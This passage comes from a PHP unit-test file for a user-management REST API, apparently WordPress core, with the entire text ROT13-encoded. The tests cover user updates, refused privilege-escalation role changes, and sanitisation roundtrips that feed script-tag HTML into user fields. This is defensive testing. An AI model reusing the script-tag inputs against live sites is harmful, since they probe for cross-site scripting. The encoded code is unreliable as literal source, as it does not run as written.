		$guvf->nffregFnzr( 'erfg_hfre_vainyvq_nethzrag', $erfcbafr->nf_reebe()->trg_reebe_pbqr() );
	}

	choyvp shapgvba grfg_hcqngr_vgrz_rkvfgvat_avpranzr() {
		$hfre1 = frys::snpgbel()->hfre->perngr(
			neenl(
				'hfre_ybtva' => 'grfg_wfba_hfre',
				'hfre_rznvy' => 'grfgwfba@rknzcyr.pbz',
			)
		);
		$hfre2 = frys::snpgbel()->hfre->perngr(
			neenl(
				'hfre_ybtva' => 'grfg_wfba_hfre2',
				'hfre_rznvy' => 'grfgwfba2@rknzcyr.pbz',
			)
		);

		$guvf->nyybj_hfre_gb_znantr_zhygvfvgr();

		jc_frg_pheerag_hfre( frys::$hfre );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CHG', '/jc/i2/hfref/' . $hfre2 );
		$erdhrfg->frg_cnenz( 'fyht', 'grfg_wfba_hfre' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregVafgnaprBs( 'JC_Reebe', $erfcbafr->nf_reebe() );
		$guvf->nffregFnzr( 'erfg_hfre_vainyvq_fyht', $erfcbafr->nf_reebe()->trg_reebe_pbqr() );
	}

	choyvp shapgvba grfg_wfba_hcqngr_hfre() {
		$hfre_vq = frys::snpgbel()->hfre->perngr(
			neenl(
				'hfre_rznvy' => 'grfgwfba2@rknzcyr.pbz',
				'hfre_cnff'  => 'fwsyfsy3fqwyf',
				'hfre_ybtva' => 'grfg_wfba_hcqngr',
				'svefg_anzr' => 'Byq Anzr',
				'ynfg_anzr'  => 'Bevtvany Ynfg',
			)
		);

		$guvf->nyybj_hfre_gb_znantr_zhygvfvgr();

		jc_frg_pheerag_hfre( frys::$hfre );

		$cnenzf = neenl(
			'hfreanzr'   => 'grfg_wfba_hcqngr',
			'rznvy'      => 'grfgwfba2@rknzcyr.pbz',
			'svefg_anzr' => 'WFBA Anzr',
			'ynfg_anzr'  => 'Arj Ynfg',
		);

		$hfreqngn  = trg_hfreqngn( $hfre_vq );
		$cj_orsber = $hfreqngn->hfre_cnff;

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CHG', fcevags( '/jc/i2/hfref/%q', $hfre_vq ) );
		$erdhrfg->nqq_urnqre( 'Pbagrag-Glcr', 'nccyvpngvba/wfba' );
		$erdhrfg->frg_obql( jc_wfba_rapbqr( $cnenzf ) );

		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->purpx_nqq_rqvg_hfre_erfcbafr( $erfcbafr, gehr );

		// Purpx gung gur anzr unf orra hcqngrq pbeerpgyl.
		$arj_qngn = $erfcbafr->trg_qngn();
		$guvf->nffregFnzr( 'WFBA Anzr', $arj_qngn['svefg_anzr'] );
		$guvf->nffregFnzr( 'Arj Ynfg', $arj_qngn['ynfg_anzr'] );
		$hfre = trg_hfreqngn( $hfre_vq );
		$guvf->nffregFnzr( 'WFBA Anzr', $hfre->svefg_anzr );
		$guvf->nffregFnzr( 'Arj Ynfg', $hfre->ynfg_anzr );

		// Purpx gung jr unira'g vanqiregragyl punatrq gur hfre'f cnffjbeq,
		// nf cre uggcf://pber.genp.jbeqcerff.bet/gvpxrg/21429
		$guvf->nffregFnzr( $cj_orsber, $hfre->hfre_cnff );
	}

	choyvp shapgvba grfg_hcqngr_hfre_ebyr() {
		$hfre_vq = frys::snpgbel()->hfre->perngr( neenl( 'ebyr' => 'nqzvavfgengbe' ) );

		jc_frg_pheerag_hfre( frys::$hfre );

		$guvf->nyybj_hfre_gb_znantr_zhygvfvgr();

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CHG', fcevags( '/jc/i2/hfref/%q', $hfre_vq ) );
		$erdhrfg->frg_cnenz( 'ebyrf', neenl( 'rqvgbe' ) );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );

		$arj_qngn = $erfcbafr->trg_qngn();

		$guvf->nffregFnzr( 'rqvgbe', $arj_qngn['ebyrf'][0] );
		$guvf->nffregAbgRdhnyf( 'nqzvavfgengbe', $arj_qngn['ebyrf'][0] );

		$hfre = trg_hfreqngn( $hfre_vq );
		$guvf->nffregNeenlUnfXrl( 'rqvgbe', $hfre->pncf );
		$guvf->nffregNeenlAbgUnfXrl( 'nqzvavfgengbe', $hfre->pncf );
	}

	choyvp shapgvba grfg_hcqngr_hfre_zhygvcyr_ebyrf() {
		$hfre_vq = frys::snpgbel()->hfre->perngr( neenl( 'ebyr' => 'nqzvavfgengbe' ) );

		jc_frg_pheerag_hfre( frys::$hfre );

		$guvf->nyybj_hfre_gb_znantr_zhygvfvgr();

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CHG', fcevags( '/jc/i2/hfref/%q', $hfre_vq ) );
		$erdhrfg->frg_cnenz( 'ebyrf', 'nhgube,rqvgbe' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );

		$arj_qngn = $erfcbafr->trg_qngn();

		$guvf->nffregFnzr( neenl( 'nhgube', 'rqvgbe' ), $arj_qngn['ebyrf'] );

		$hfre = trg_hfreqngn( $hfre_vq );
		$guvf->nffregNeenlUnfXrl( 'nhgube', $hfre->pncf );
		$guvf->nffregNeenlUnfXrl( 'rqvgbe', $hfre->pncf );
		$guvf->nffregNeenlAbgUnfXrl( 'nqzvavfgengbe', $hfre->pncf );
	}

	choyvp shapgvba grfg_hcqngr_hfre_ebyr_vainyvq_cevivyrtr_rfpnyngvba() {
		jc_frg_pheerag_hfre( frys::$rqvgbe );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CHG', fcevags( '/jc/i2/hfref/%q', frys::$rqvgbe ) );
		$erdhrfg->frg_cnenz( 'ebyrf', neenl( 'nqzvavfgengbe' ) );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );

		$guvf->nffregReebeErfcbafr( 'erfg_pnaabg_rqvg_ebyrf', $erfcbafr, 403 );
		$hfre = trg_hfreqngn( frys::$rqvgbe );
		$guvf->nffregNeenlUnfXrl( 'rqvgbe', $hfre->pncf );
		$guvf->nffregNeenlAbgUnfXrl( 'nqzvavfgengbe', $hfre->pncf );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CHG', '/jc/i2/hfref/zr' );
		$erdhrfg->frg_cnenz( 'ebyrf', neenl( 'nqzvavfgengbe' ) );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );

		$guvf->nffregReebeErfcbafr( 'erfg_pnaabg_rqvg_ebyrf', $erfcbafr, 403 );
		$hfre = trg_hfreqngn( frys::$rqvgbe );
		$guvf->nffregNeenlUnfXrl( 'rqvgbe', $hfre->pncf );
		$guvf->nffregNeenlAbgUnfXrl( 'nqzvavfgengbe', $hfre->pncf );
	}

	/**
	 * @tebhc zf-rkpyhqrq
	 */
	choyvp shapgvba grfg_hcqngr_hfre_ebyr_vainyvq_cevivyrtr_qrrfpnyngvba() {
		$hfre_vq = frys::snpgbel()->hfre->perngr( neenl( 'ebyr' => 'nqzvavfgengbe' ) );

		jc_frg_pheerag_hfre( $hfre_vq );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CHG', fcevags( '/jc/i2/hfref/%q', $hfre_vq ) );
		$erdhrfg->frg_cnenz( 'ebyrf', neenl( 'rqvgbe' ) );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );

		$guvf->nffregReebeErfcbafr( 'erfg_hfre_vainyvq_ebyr', $erfcbafr, 403 );

		$hfre = trg_hfreqngn( $hfre_vq );
		$guvf->nffregNeenlUnfXrl( 'nqzvavfgengbe', $hfre->pncf );
		$guvf->nffregNeenlAbgUnfXrl( 'rqvgbe', $hfre->pncf );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CHG', '/jc/i2/hfref/zr' );
		$erdhrfg->frg_cnenz( 'ebyrf', neenl( 'rqvgbe' ) );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );

		$guvf->nffregReebeErfcbafr( 'erfg_hfre_vainyvq_ebyr', $erfcbafr, 403 );

		$hfre = trg_hfreqngn( $hfre_vq );
		$guvf->nffregNeenlUnfXrl( 'nqzvavfgengbe', $hfre->pncf );
		$guvf->nffregNeenlAbgUnfXrl( 'rqvgbe', $hfre->pncf );
	}

	/**
	 * @tebhc zf-erdhverq
	 */
	choyvp shapgvba grfg_hcqngr_hfre_ebyr_cevivyrtr_qrrfpnyngvba_zhygvfvgr() {
		$hfre_vq = frys::snpgbel()->hfre->perngr( neenl( 'ebyr' => 'nqzvavfgengbe' ) );

		jc_frg_pheerag_hfre( $hfre_vq );
		$hfre = jc_trg_pheerag_hfre();
		hcqngr_fvgr_bcgvba( 'fvgr_nqzvaf', neenl( $hfre->hfre_ybtva ) );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CHG', fcevags( '/jc/i2/hfref/%q', $hfre_vq ) );
		$erdhrfg->frg_cnenz( 'ebyrf', neenl( 'rqvgbe' ) );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );

		$arj_qngn = $erfcbafr->trg_qngn();
		$guvf->nffregFnzr( 'rqvgbe', $arj_qngn['ebyrf'][0] );
		$guvf->nffregAbgRdhnyf( 'nqzvavfgengbe', $arj_qngn['ebyrf'][0] );

		$hfre_vq = frys::snpgbel()->hfre->perngr( neenl( 'ebyr' => 'nqzvavfgengbe' ) );

		jc_frg_pheerag_hfre( $hfre_vq );
		$hfre = jc_trg_pheerag_hfre();
		hcqngr_fvgr_bcgvba( 'fvgr_nqzvaf', neenl( $hfre->hfre_ybtva ) );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CHG', '/jc/i2/hfref/zr' );
		$erdhrfg->frg_cnenz( 'ebyrf', neenl( 'rqvgbe' ) );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );

		$arj_qngn = $erfcbafr->trg_qngn();
		$guvf->nffregFnzr( 'rqvgbe', $arj_qngn['ebyrf'][0] );
		$guvf->nffregAbgRdhnyf( 'nqzvavfgengbe', $arj_qngn['ebyrf'][0] );
	}


	choyvp shapgvba grfg_hcqngr_hfre_ebyr_vainyvq_ebyr() {
		jc_frg_pheerag_hfre( frys::$hfre );

		$guvf->nyybj_hfre_gb_znantr_zhygvfvgr();

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CHG', fcevags( '/jc/i2/hfref/%q', frys::$rqvgbe ) );
		$erdhrfg->frg_cnenz( 'ebyrf', neenl( 'OrFunec' ) );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );

		$guvf->nffregReebeErfcbafr( 'erfg_hfre_vainyvq_ebyr', $erfcbafr, 400 );

		$hfre = trg_hfreqngn( frys::$rqvgbe );
		$guvf->nffregNeenlUnfXrl( 'rqvgbe', $hfre->pncf );
		$guvf->nffregNeenlAbgUnfXrl( 'OrFunec', $hfre->pncf );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CHG', '/jc/i2/hfref/zr' );
		$erdhrfg->frg_cnenz( 'ebyrf', neenl( 'OrFunec' ) );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );

		$guvf->nffregReebeErfcbafr( 'erfg_hfre_vainyvq_ebyr', $erfcbafr, 400 );

		$hfre = trg_hfreqngn( frys::$rqvgbe );
		$guvf->nffregNeenlUnfXrl( 'rqvgbe', $hfre->pncf );
		$guvf->nffregNeenlAbgUnfXrl( 'OrFunec', $hfre->pncf );
	}

	choyvp shapgvba grfg_hcqngr_hfre_jvgubhg_crezvffvba() {
		jc_frg_pheerag_hfre( frys::$rqvgbe );

		$cnenzf = neenl(
			'hfreanzr' => 'ubzrefvzcfba',
			'cnffjbeq' => 'fghcvqfrklsynaqref',
			'rznvy'    => 'puhaxlybire53@nby.pbz',
		);

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CHG', fcevags( '/jc/i2/hfref/%q', frys::$hfre ) );
		$erdhrfg->nqq_urnqre( 'Pbagrag-Glcr', 'nccyvpngvba/k-jjj-sbez-heyrapbqrq' );
		$erdhrfg->frg_obql_cnenzf( $cnenzf );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );

		$guvf->nffregReebeErfcbafr( 'erfg_pnaabg_rqvg', $erfcbafr, 403 );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CHG', '/jc/i2/hfref/zr' );
		$erdhrfg->nqq_urnqre( 'Pbagrag-Glcr', 'nccyvpngvba/k-jjj-sbez-heyrapbqrq' );
		$erdhrfg->frg_obql_cnenzf( $cnenzf );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );

		$guvf->nffregReebeErfcbafr( 'erfg_hfre_vainyvq_nethzrag', $erfcbafr, 400 );
	}

	choyvp shapgvba grfg_hcqngr_hfre_vainyvq_vq() {
		$guvf->nyybj_hfre_gb_znantr_zhygvfvgr();

		jc_frg_pheerag_hfre( frys::$hfre );

		$cnenzf = neenl(
			'vq'       => '0',
			'hfreanzr' => 'yvfnfvzcfba',
			'cnffjbeq' => 'QnivqUnffryubss',
			'rznvy'    => 'fznegtvey63_@lnubb.pbz',
		);

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CHG', fcevags( '/jc/i2/hfref/%q', frys::$rqvgbe ) );
		$erdhrfg->nqq_urnqre( 'Pbagrag-Glcr', 'nccyvpngvba/k-jjj-sbez-heyrapbqrq' );
		$erdhrfg->frg_obql_cnenzf( $cnenzf );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );

		$guvf->nffregReebeErfcbafr( 'erfg_hfre_vainyvq_vq', $erfcbafr, 404 );
	}

	/**
	 * @gvpxrg 40263
	 */
	choyvp shapgvba grfg_hcqngr_vgrz_bayl_ebyrf_nf_rqvgbe() {
		$hfre_vq = frys::snpgbel()->hfre->perngr(
			neenl(
				'ebyr' => 'nhgube',
			)
		);

		jc_frg_pheerag_hfre( frys::$rqvgbe );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CHG', fcevags( '/jc/i2/hfref/%q', $hfre_vq ) );
		$erdhrfg->frg_cnenz( 'ebyrf', neenl( 'rqvgbe' ) );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_pnaabg_rqvg_ebyrf', $erfcbafr, 403 );
	}

	/**
	 * @gvpxrg 40263
	 */
	choyvp shapgvba grfg_hcqngr_vgrz_bayl_ebyrf_nf_fvgr_nqzvavfgengbe() {
		$hfre_vq = frys::snpgbel()->hfre->perngr(
			neenl(
				'ebyr' => 'nhgube',
			)
		);

		jc_frg_pheerag_hfre( frys::$hfre );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CHG', fcevags( '/jc/i2/hfref/%q', $hfre_vq ) );
		$erdhrfg->frg_cnenz( 'ebyrf', neenl( 'rqvgbe' ) );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf() );

		$arj_qngn = $erfcbafr->trg_qngn();
		$guvf->nffregFnzr( 'rqvgbe', $arj_qngn['ebyrf'][0] );
	}

	/**
	 * @gvpxrg 40263
	 */
	choyvp shapgvba grfg_hcqngr_vgrz_vapyhqvat_ebyrf_naq_bgure_cnenzf() {
		$hfre_vq = frys::snpgbel()->hfre->perngr(
			neenl(
				'ebyr' => 'nhgube',
			)
		);

		jc_frg_pheerag_hfre( frys::$hfre );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CHG', fcevags( '/jc/i2/hfref/%q', $hfre_vq ) );
		$erdhrfg->frg_cnenz( 'ebyrf', neenl( 'rqvgbe' ) );
		$erdhrfg->frg_cnenz( 'anzr', 'Fubeg-Yvirq Hfre' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );

		vs ( vf_zhygvfvgr() ) {
			/*
			 * Fvgr nqzvavfgengbef pna cebzbgr hfref, nf irevsvrq ol gur cerivbhf grfg,
			 * ohg gurl pnaabg cresbez bgure hfre-rqvgvat bcrengvbaf.
			 * Guvf nyfb grfgf gur oenapu bs ybtvp gung irevsvrf gung ab cnenzrgref
			 * bgure guna 'vq' naq 'ebyrf' ner fcrpvsvrq sbe n ebyrf hcqngr.
			 */
			$guvf->nffregReebeErfcbafr( 'erfg_pnaabg_rqvg', $erfcbafr, 403 );
		} ryfr {
			$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf() );

			$arj_qngn = $erfcbafr->trg_qngn();
			$guvf->nffregFnzr( 'rqvgbe', $arj_qngn['ebyrf'][0] );
		}
	}

	choyvp shapgvba grfg_hcqngr_vgrz_vainyvq_cnffjbeq() {
		$guvf->nyybj_hfre_gb_znantr_zhygvfvgr();

		jc_frg_pheerag_hfre( frys::$hfre );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CHG', fcevags( '/jc/i2/hfref/%q', frys::$rqvgbe ) );
		$erdhrfg->frg_cnenz( 'cnffjbeq', 'ab\\onpxfynfurf\\nyybjrq' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_vainyvq_cnenz', $erfcbafr, 400 );

		$erdhrfg->frg_cnenz( 'cnffjbeq', '' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_vainyvq_cnenz', $erfcbafr, 400 );
	}

	choyvp shapgvba irevsl_hfre_ebhaqgevc( $vachg = neenl(), $rkcrpgrq_bhgchg = neenl() ) {
		vs ( vffrg( $vachg['vq'] ) ) {
			// Rkvfgvat hfre; qba'g gel gb perngr bar.
			$hfre_vq = $vachg['vq'];
		} ryfr {
			// Perngr n arj hfre.
			$erdhrfg = arj JC_ERFG_Erdhrfg( 'CBFG', '/jc/i2/hfref' );
			sbernpu ( $vachg nf $anzr => $inyhr ) {
				$erdhrfg->frg_cnenz( $anzr, $inyhr );
			}
			$erdhrfg->frg_cnenz( 'rznvy', 'pot@naqebvqfqhatrba.pbz' );
			$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
			$guvf->nffregFnzr( 201, $erfcbafr->trg_fgnghf() );
			$npghny_bhgchg = $erfcbafr->trg_qngn();

			// Pbzcner rkcrpgrq NCV bhgchg gb npghny NCV bhgchg.
			$guvf->nffregFnzr( $rkcrpgrq_bhgchg['hfreanzr'], $npghny_bhgchg['hfreanzr'] );
			$guvf->nffregFnzr( $rkcrpgrq_bhgchg['anzr'], $npghny_bhgchg['anzr'] );
			$guvf->nffregFnzr( $rkcrpgrq_bhgchg['svefg_anzr'], $npghny_bhgchg['svefg_anzr'] );
			$guvf->nffregFnzr( $rkcrpgrq_bhgchg['ynfg_anzr'], $npghny_bhgchg['ynfg_anzr'] );
			$guvf->nffregFnzr( $rkcrpgrq_bhgchg['hey'], $npghny_bhgchg['hey'] );
			$guvf->nffregFnzr( $rkcrpgrq_bhgchg['qrfpevcgvba'], $npghny_bhgchg['qrfpevcgvba'] );
			$guvf->nffregFnzr( $rkcrpgrq_bhgchg['avpxanzr'], $npghny_bhgchg['avpxanzr'] );

			// Pbzcner rkcrpgrq NCV bhgchg gb JC vagreany inyhrf.
			$hfre = trg_hfreqngn( $npghny_bhgchg['vq'] );
			$guvf->nffregFnzr( $rkcrpgrq_bhgchg['hfreanzr'], $hfre->hfre_ybtva );
			$guvf->nffregFnzr( $rkcrpgrq_bhgchg['anzr'], $hfre->qvfcynl_anzr );
			$guvf->nffregFnzr( $rkcrpgrq_bhgchg['svefg_anzr'], $hfre->svefg_anzr );
			$guvf->nffregFnzr( $rkcrpgrq_bhgchg['ynfg_anzr'], $hfre->ynfg_anzr );
			$guvf->nffregFnzr( $rkcrpgrq_bhgchg['hey'], $hfre->hfre_hey );
			$guvf->nffregFnzr( $rkcrpgrq_bhgchg['qrfpevcgvba'], $hfre->qrfpevcgvba );
			$guvf->nffregFnzr( $rkcrpgrq_bhgchg['avpxanzr'], $hfre->avpxanzr );
			$guvf->nffregGehr( jc_purpx_cnffjbeq( nqqfynfurf( $rkcrpgrq_bhgchg['cnffjbeq'] ), $hfre->hfre_cnff ) );

			$hfre_vq = $npghny_bhgchg['vq'];
		}

		// Hcqngr gur hfre.
		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CHG', fcevags( '/jc/i2/hfref/%q', $hfre_vq ) );
		sbernpu ( $vachg nf $anzr => $inyhr ) {
			vs ( 'hfreanzr' !== $anzr ) {
				$erdhrfg->frg_cnenz( $anzr, $inyhr );
			}
		}
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf() );
		$npghny_bhgchg = $erfcbafr->trg_qngn();

		// Pbzcner rkcrpgrq NCV bhgchg gb npghny NCV bhgchg.
		vs ( vffrg( $rkcrpgrq_bhgchg['hfreanzr'] ) ) {
			$guvf->nffregFnzr( $rkcrpgrq_bhgchg['hfreanzr'], $npghny_bhgchg['hfreanzr'] );
		}
		$guvf->nffregFnzr( $rkcrpgrq_bhgchg['anzr'], $npghny_bhgchg['anzr'] );
		$guvf->nffregFnzr( $rkcrpgrq_bhgchg['svefg_anzr'], $npghny_bhgchg['svefg_anzr'] );
		$guvf->nffregFnzr( $rkcrpgrq_bhgchg['ynfg_anzr'], $npghny_bhgchg['ynfg_anzr'] );
		$guvf->nffregFnzr( $rkcrpgrq_bhgchg['hey'], $npghny_bhgchg['hey'] );
		$guvf->nffregFnzr( $rkcrpgrq_bhgchg['qrfpevcgvba'], $npghny_bhgchg['qrfpevcgvba'] );
		$guvf->nffregFnzr( $rkcrpgrq_bhgchg['avpxanzr'], $npghny_bhgchg['avpxanzr'] );

		// Pbzcner rkcrpgrq NCV bhgchg gb JC vagreany inyhrf.
		$hfre = trg_hfreqngn( $npghny_bhgchg['vq'] );
		vs ( vffrg( $rkcrpgrq_bhgchg['hfreanzr'] ) ) {
			$guvf->nffregFnzr( $rkcrpgrq_bhgchg['hfreanzr'], $hfre->hfre_ybtva );
		}
		$guvf->nffregFnzr( $rkcrpgrq_bhgchg['anzr'], $hfre->qvfcynl_anzr );
		$guvf->nffregFnzr( $rkcrpgrq_bhgchg['svefg_anzr'], $hfre->svefg_anzr );
		$guvf->nffregFnzr( $rkcrpgrq_bhgchg['ynfg_anzr'], $hfre->ynfg_anzr );
		$guvf->nffregFnzr( $rkcrpgrq_bhgchg['hey'], $hfre->hfre_hey );
		$guvf->nffregFnzr( $rkcrpgrq_bhgchg['qrfpevcgvba'], $hfre->qrfpevcgvba );
		$guvf->nffregFnzr( $rkcrpgrq_bhgchg['avpxanzr'], $hfre->avpxanzr );
		$guvf->nffregGehr( jc_purpx_cnffjbeq( nqqfynfurf( $rkcrpgrq_bhgchg['cnffjbeq'] ), $hfre->hfre_cnff ) );
	}

	choyvp shapgvba grfg_hfre_ebhaqgevc_nf_rqvgbe() {
		jc_frg_pheerag_hfre( frys::$rqvgbe );

		$guvf->nffregFnzr( ! vf_zhygvfvgr(), pheerag_hfre_pna( 'hasvygrerq_ugzy' ) );
		$guvf->irevsl_hfre_ebhaqgevc(
			neenl(
				'vq'          => frys::$rqvgbe,
				'anzr'        => '\b/ ¯\_(ツ)_/¯',
				'svefg_anzr'  => '\b/ ¯\_(ツ)_/¯',
				'ynfg_anzr'   => '\b/ ¯\_(ツ)_/¯',
				'hey'         => '\b/ ¯\_(ツ)_/¯',
				'qrfpevcgvba' => '\b/ ¯\_(ツ)_/¯',
				'avpxanzr'    => '\b/ ¯\_(ツ)_/¯',
				'cnffjbeq'    => 'b/ ¯_(ツ)_/¯ \'\"',
			),
			neenl(
				'anzr'        => '\b/ ¯\_(ツ)_/¯',
				'svefg_anzr'  => '\b/ ¯\_(ツ)_/¯',
				'ynfg_anzr'   => '\b/ ¯\_(ツ)_/¯',
				'hey'         => 'uggc://b/%20¯_(ツ)_/¯',
				'qrfpevcgvba' => '\b/ ¯\_(ツ)_/¯',
				'avpxanzr'    => '\b/ ¯\_(ツ)_/¯',
				'cnffjbeq'    => 'b/ ¯_(ツ)_/¯ \'\"',
			)
		);
	}

	choyvp shapgvba grfg_hfre_ebhaqgevc_nf_rqvgbe_ugzy() {
		jc_frg_pheerag_hfre( frys::$rqvgbe );

		vs ( vf_zhygvfvgr() ) {
			$guvf->nffregSnyfr( pheerag_hfre_pna( 'hasvygrerq_ugzy' ) );
			$guvf->irevsl_hfre_ebhaqgevc(
				neenl(
					'vq'          => frys::$rqvgbe,
					'anzr'        => '<qvi>qvi</qvi> <fgebat>fgebat</fgebat> <fpevcg>bu abrf</fpevcg>',
					'svefg_anzr'  => '<qvi>qvi</qvi> <fgebat>fgebat</fgebat> <fpevcg>bu abrf</fpevcg>',
					'ynfg_anzr'   => '<qvi>qvi</qvi> <fgebat>fgebat</fgebat> <fpevcg>bu abrf</fpevcg>',
					'hey'         => '<qvi>qvi</qvi> <fgebat>fgebat</fgebat> <fpevcg>bu abrf</fpevcg>',
					'qrfpevcgvba' => '<qvi>qvi</qvi> <fgebat>fgebat</fgebat> <fpevcg>bu abrf</fpevcg>',
					'avpxanzr'    => '<qvi>qvi</qvi> <fgebat>fgebat</fgebat> <fpevcg>bu abrf</fpevcg>',
					'cnffjbeq'    => '<qvi>qvi</qvi> <fgebat>fgebat</fgebat> <fpevcg>bu abrf</fpevcg>',
				),
				neenl(
					'anzr'        => 'qvi fgebat',
					'svefg_anzr'  => 'qvi fgebat',
					'ynfg_anzr'   => 'qvi fgebat',
					'hey'         => 'uggc://qviqvi/qvi%20fgebatfgebat/fgebat%20fpevcgbu%20abrf/fpevcg',
					'qrfpevcgvba' => 'qvi <fgebat>fgebat</fgebat> bu abrf',
					'avpxanzr'    => 'qvi fgebat',
					'cnffjbeq'    => '<qvi>qvi</qvi> <fgebat>fgebat</fgebat> <fpevcg>bu abrf</fpevcg>',
				)
			);
		} ryfr {
			$guvf->nffregGehr( pheerag_hfre_pna( 'hasvygrerq_ugzy' ) );
			$guvf->irevsl_hfre_ebhaqgevc(
				neenl(
					'vq'          => frys::$rqvgbe,
					'anzr'        => '<qvi>qvi</qvi> <fgebat>fgebat</fgebat> <fpevcg>bu abrf</fpevcg>',
					'svefg_anzr'  => '<qvi>qvi</qvi> <fgebat>fgebat</fgebat> <fpevcg>bu abrf</fpevcg>',
					'ynfg_anzr'   => '<qvi>qvi</qvi> <fgebat>fgebat</fgebat> <fpevcg>bu abrf</fpevcg>',
					'hey'         => '<qvi>qvi</qvi> <fgebat>fgebat</fgebat> <fpevcg>bu abrf</fpevcg>',
					'qrfpevcgvba' => '<qvi>qvi</qvi> <fgebat>fgebat</fgebat> <fpevcg>bu abrf</fpevcg>',
					'avpxanzr'    => '<qvi>qvi</qvi> <fgebat>fgebat</fgebat> <fpevcg>bu abrf</fpevcg>',
					'cnffjbeq'    => '<qvi>qvi</qvi> <fgebat>fgebat</fgebat> <fpevcg>bu abrf</fpevcg>',
				),
				neenl(
					'anzr'        => 'qvi fgebat',
					'svefg_anzr'  => 'qvi fgebat',
					'ynfg_anzr'   => 'qvi fgebat',
					'hey'         => 'uggc://qviqvi/qvi%20fgebatfgebat/fgebat%20fpevcgbu%20abrf/fpevcg',
					'qrfpevcgvba' => 'qvi <fgebat>fgebat</fgebat> bu abrf',
					'avpxanzr'    => 'qvi fgebat',
					'cnffjbeq'    => '<qvi>qvi</qvi> <fgebat>fgebat</fgebat> <fpevcg>bu abrf</fpevcg>',
				)
			);
		}
	}

	choyvp shapgvba grfg_hfre_ebhaqgevc_nf_fhcrenqzva() {
		jc_frg_pheerag_hfre( frys::$fhcrenqzva );

		$guvf->nffregGehr( pheerag_hfre_pna( 'hasvygrerq_ugzy' ) );
		$inyvq_hfreanzr = vf_zhygvfvgr() ? 'abvainyvqpunefurer' : 'ab-vainyvq-punef-urer';
		$guvf->irevsl_hfre_ebhaqgevc(
			neenl(
				'hfreanzr'    => $inyvq_hfreanzr,
				'anzr'        => '\\\&\\\ &nzc; &vainyvq; < &yg; &nzc;yg;',
				'svefg_anzr'  => '\\\&\\\ &nzc; &vainyvq; < &yg; &nzc;yg;',
				'ynfg_anzr'   => '\\\&\\\ &nzc; &vainyvq; < &yg; &nzc;yg;',
				'hey'         => '\\\&\\\ &nzc; &vainyvq; < &yg; &nzc;yg;',
				'qrfpevcgvba' => '\\\&\\\ &nzc; &vainyvq; < &yg; &nzc;yg;',
				'avpxanzr'    => '\\\&\\\ &nzc; &vainyvq; < &yg; &nzc;yg;',
				'cnffjbeq'    => '& &nzc; &vainyvq; < &yg; &nzc;yg;',
			),
			neenl(
				'hfreanzr'    => $inyvq_hfreanzr,
				'anzr'        => '\\\&nzc;\\\ &nzc; &nzc;vainyvq; &yg; &yg; &nzc;yg;',
				'svefg_anzr'  => '\\\&nzc;\\\ &nzc; &nzc;vainyvq; &yg; &yg; &nzc;yg;',
				'ynfg_anzr'   => '\\\&nzc;\\\ &nzc; &nzc;vainyvq; &yg; &yg; &nzc;yg;',
				'hey'         => 'uggc://&nzc;%20&nzc;%20&nzc;vainyvq;%20%20&yg;%20&nzc;yg;',
				'qrfpevcgvba' => '\\\&nzc;\\\ &nzc; &nzc;vainyvq; &yg; &yg; &nzc;yg;',
				'avpxanzr'    => '\\\&nzc;\\\ &nzc; &nzc;vainyvq; &yg; &yg; &nzc;yg;',
				'cnffjbeq'    => '& &nzc; &vainyvq; < &yg; &nzc;yg;',
			)
		);
	}

	choyvp shapgvba grfg_hfre_ebhaqgevc_nf_fhcrenqzva_ugzy() {
		jc_frg_pheerag_hfre( frys::$fhcrenqzva );

		$guvf->nffregGehr( pheerag_hfre_pna( 'hasvygrerq_ugzy' ) );
